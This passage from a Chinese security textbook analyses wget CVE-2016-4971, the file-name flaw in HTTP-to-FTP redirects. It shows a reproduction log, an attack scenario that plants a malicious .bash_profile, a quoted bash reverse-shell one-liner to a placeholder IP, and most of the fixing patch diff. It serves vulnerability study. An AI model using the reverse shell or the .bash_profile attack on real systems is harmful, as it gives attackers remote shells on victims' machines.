$ make && sudo make install
发出请求：
$ wget 0.0.0.0/noharm.txt
--2018-01-29 16:32:15-- http://0.0.0.0/noharm.txt
Connecting to 0.0.0.0:80... connected.
HTTP request sent, awaiting response... 302 FOUND
Location: ftp://127.0.0.1/harm.txt [following]
--2018-01-29 16:32:15-- ftp://127.0.0.1/harm.txt
=> ‘harm.txt’
Connecting to 127.0.0.1:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done. ==> PWD ... done.
==> TYPE I ... done. ==> CWD not needed.
==> SIZE harm.txt ... 21
==> PASV ... done. ==> RETR harm.txt ... done.
Length: 21 (unauthoritative)
harm.txt 100%[=============================
=================>] 21 --.-KB/s in 0s
2018-01-29 16:32:15 (3.41 MB/s) - ‘harm.txt’ saved [21]
$ cat harm.txt
"you've been hacked"
Bingo!!!这一次 harm.txt 没有被修改成原始请求的文件名。
在参考资料中，展示了一种针对 .bash_profile 的攻击，我们知道在刚登录 Linux
时，.bash_profile 会被执行，用于设置一些环境变量。但如果该文件是一个恶意的
文件，比如 bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9980 0>&1 这样的
payload，执行后就会返回一个 shell 给攻击者。
1539
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
如果某个人在自己的 home 目录下执行了 wget 请求，并且该目录下没有
.bash_profile，那么利用该漏洞，攻击这就可以将恶意的 .bash_profile 保存到这个
人的 home 下。下一次启动时，恶意代码被执行，获得 shell。
漏洞分析
补丁
$ git diff e996e322ffd42aaa051602da182d03178d0f13e1 src/ftp.c |
cat
commit e996e322ffd42aaa051602da182d03178d0f13e1
Author: Giuseppe Scrivano 
Date: Mon Jun 6 21:20:24 2016 +0200
ftp: understand --trust-server-names on a HTTP->FTP redirect
If not --trust-server-names is used, FTP will also get the d
estination
file name from the original url specified by the user instea
d of the
redirected url. Closes CVE-2016-4971.
* src/ftp.c (ftp_get_listing): Add argument original_url.
(getftp): Likewise.
(ftp_loop_internal): Likewise. Use original_url to generate
the
file name if --trust-server-names is not provided.
(ftp_retrieve_glob): Likewise.
(ftp_loop): Likewise.
Signed-off-by: Giuseppe Scrivano 
diff --git a/src/ftp.c b/src/ftp.c
index cc90c3d..88a9777 100644
--- a/src/ftp.c
+++ b/src/ftp.c
@@ -236,7 +236,7 @@ print_length (wgint size, wgint start, bool
authoritative)
1540
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
logputs (LOG_VERBOSE, !authoritative ? _(" (unauthoritative)\
n") : "\n");
}
-static uerr_t ftp_get_listing (struct url *, ccon *, struct fil
einfo **);
+static uerr_t ftp_get_listing (struct url *, struct url *, ccon
*, struct fileinfo **);
static uerr_t
get_ftp_greeting(int csock, ccon *con)
@@ -315,7 +315,8 @@ init_control_ssl_connection (int csock, stru
ct url *u, bool *using_control_secur
and closes the control connection in case of error. If warc
_tmp
is non-NULL, the downloaded data will be written there as we
ll. */
static uerr_t
-getftp (struct url *u, wgint passed_expected_bytes, wgint *qtyr
ead,
+getftp (struct url *u, struct url *original_url,
+ wgint passed_expected_bytes, wgint *qtyread,
wgint restval, ccon *con, int count, wgint *last_expect
ed_bytes,
FILE *warc_tmp)
{
@@ -1188,7 +1189,7 @@ Error in server response, closing control
connection.\n"));
{
bool exists = false;
struct fileinfo *f;
- uerr_t _res = ftp_get_listing (u, con, &f);
+ uerr_t _res = ftp_get_listing (u, original_url, con,
&f);
/* Set the DO_RETR command flag again, because it get
s unset when
calling ftp_get_listing() and would otherwise caus
e an assertion
failure earlier on when this function gets repeate
dly called
1541
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
@@ -1779,8 +1780,8 @@ exit_error:
This loop either gets commands from con, or (if ON_YOUR_OWN
is
set), makes them up to retrieve the file given by the URL.
*/
static uerr_t
-ftp_loop_internal (struct url *u, struct fileinfo *f, ccon *con
, char **local_file,
- bool force_full_retrieve)
+ftp_loop_internal (struct url *u, struct url *original_url, str
uct fileinfo *f,
+ ccon *con, char **local_file, bool force_ful
l_retrieve)
{
int count, orig_lp;
wgint restval, len = 0, qtyread = 0;
@@ -1805,7 +1806,7 @@ ftp_loop_internal (struct url *u, struct f
ileinfo *f, ccon *con, char **local_fi
{
/* URL-derived file. Consider "-O file" name. */
xfree (con->target);
- con->target = url_file_name (u, NULL);
+ con->target = url_file_name (opt.trustservernames || !ori
ginal_url ? u : original_url, NULL);
if (!opt.output_document)
locf = con->target;
else
@@ -1923,8 +1924,8 @@ ftp_loop_internal (struct url *u, struct f
ileinfo *f, ccon *con, char **local_fi
/* If we are working on a WARC record, getftp should also
write
to the warc_tmp file. */
- err = getftp (u, len, &qtyread, restval, con, count, &las
t_expected_bytes,
- warc_tmp);
+ err = getftp (u, original_url, len, &qtyread, restval, co
n, count,
+ &last_expected_bytes, warc_tmp);
1542
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
if (con->csock == -1)
con->st &= ~DONE_CWD;
@@ -2092,7 +2093,8 @@ Removing file due to --delete-after in ftp
_loop_internal():\n"));
/* Return the directory listing in a reusable format. The dire
ctory
is specifed in u->dir. */
static uerr_t
-ftp_get_listing (struct url *u, ccon *con, struct fileinfo **f)
+ftp_get_listing (struct url *u, struct url *original_url, ccon
*con,
+ struct fileinfo **f)
{
uerr_t err;
char *uf; /* url file name */
@@ -2113,7 +2115,7 @@ ftp_get_listing (struct url *u, ccon *con,
struct fileinfo **f)
con->target = xstrdup (lf);
xfree (lf);
- err = ftp_loop_internal (u, NULL, con, NULL, false);
+ err = ftp_loop_internal (u, original_url, NULL, con, NULL, fa
lse);
lf = xstrdup (con->target);
xfree (con->target);
con->target = old_target;
@@ -2136,8 +2138,9 @@ ftp_get_listing (struct url *u, ccon *con,
struct fileinfo **f)
return err;
}
-static uerr_t ftp_retrieve_dirs (struct url *, struct fileinfo
*, ccon *);
-static uerr_t ftp_retrieve_glob (struct url *, ccon *, int);
+static uerr_t ftp_retrieve_dirs (struct url *, struct url *,
+ struct fileinfo *, ccon *);
+static uerr_t ftp_retrieve_glob (struct url *, struct url *, cc
on *, int);
static struct fileinfo *delelement (struct fileinfo *, struct f
ileinfo **);
1543
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
static void freefileinfo (struct fileinfo *f);
@@ -2149,7 +2152,8 @@ static void freefileinfo (struct fileinfo
*f);
If opt.recursive is set, after all files have been retrieved
,
ftp_retrieve_dirs will be called to retrieve the directories
. */
static uerr_t
-ftp_retrieve_list (struct url *u, struct fileinfo *f, ccon *con)
+ftp_retrieve_list (struct url *u, struct url *original_url,
+ struct fileinfo *f, ccon *con)
{
static int depth = 0;
uerr_t err;
@@ -2310,7 +2314,10 @@ Already have correct symlink %s -> %s\n\n
"),
else /* opt.retr_symlinks */
{
if (dlthis)
- err = ftp_loop_internal (u, f, con, NULL, force
_full_retrieve);
+ {
+ err = ftp_loop_internal (u, original_url, f,
con, NULL,
+ force_full_retrieve);
+ }
} /* opt.retr_symlinks */
break;
case FT_DIRECTORY:
@@ -2321,7 +2328,10 @@ Already have correct symlink %s -> %s\n\n
"),
case FT_PLAINFILE:
/* Call the retrieve loop. */
if (dlthis)
- err = ftp_loop_internal (u, f, con, NULL, force_ful
l_retrieve);
+ {
1544
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
+ err = ftp_loop_internal (u, original_url, f, con,
NULL,
+ force_full_retrieve);
+ }
break;
case FT_UNKNOWN:
logprintf (LOG_NOTQUIET, _("%s: unknown/unsupported f
ile type.\n"),
@@ -2386,7 +2396,7 @@ Already have correct symlink %s -> %s\n\n"
),
/* We do not want to call ftp_retrieve_dirs here */
if (opt.recursive &&
!(opt.reclevel != INFINITE_RECURSION && depth >= opt.recl
evel))
- err = ftp_retrieve_dirs (u, orig, con);
+ err = ftp_retrieve_dirs (u, original_url, orig, con);
else if (opt.recursive)
DEBUGP ((_("Will not retrieve dirs since depth is %d (max %
d).\n"),
depth, opt.reclevel));
@@ -2399,7 +2409,8 @@ Already have correct symlink %s -> %s\n\n"
),
ftp_retrieve_glob on each directory entry. The function kno
ws
about excluded directories. */
static uerr_t
-ftp_retrieve_dirs (struct url *u, struct fileinfo *f, ccon *con)
+ftp_retrieve_dirs (struct url *u, struct url *original_url,
+ struct fileinfo *f, ccon *con)
{
char *container = NULL;
int container_size = 0;
@@ -2449,7 +2460,7 @@ Not descending to %s as it is excluded/not
-included.\n"),
odir = xstrdup (u->dir); /* because url_set_dir will fre
e
u->dir. */
url_set_dir (u, newdir);
- ftp_retrieve_glob (u, con, GLOB_GETALL);
1545
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
+ ftp_retrieve_glob (u, original_url, con, GLOB_GETALL);
url_set_dir (u, odir);
xfree (odir);
@@ -2508,14 +2519,15 @@ is_invalid_entry (struct fileinfo *f)
GLOB_GLOBALL, use globbing; if it's GLOB_GETALL, download th
e whole
directory. */
static uerr_t
-ftp_retrieve_glob (struct url *u, ccon *con, int action)
+ftp_retrieve_glob (struct url *u, struct url *original_url,
+ ccon *con, int action)
{
struct fileinfo *f, *start;
uerr_t res;
con->cmd |= LEAVE_PENDING;
- res = ftp_get_listing (u, con, &start);
+ res = ftp_get_listing (u, original_url, con, &start);
if (res != RETROK)
return res;
/* First: weed out that do not conform the global rules given
in
@@ -2611,7 +2623,7 @@ ftp_retrieve_glob (struct url *u, ccon *co
n, int action)
if (start)
{
/* Just get everything. */
- res = ftp_retrieve_list (u, start, con);
+ res = ftp_retrieve_list (u, original_url, start, con);
}
else
{
@@ -2627,7 +2639,7 @@ ftp_retrieve_glob (struct url *u, ccon *co
n, int action)
{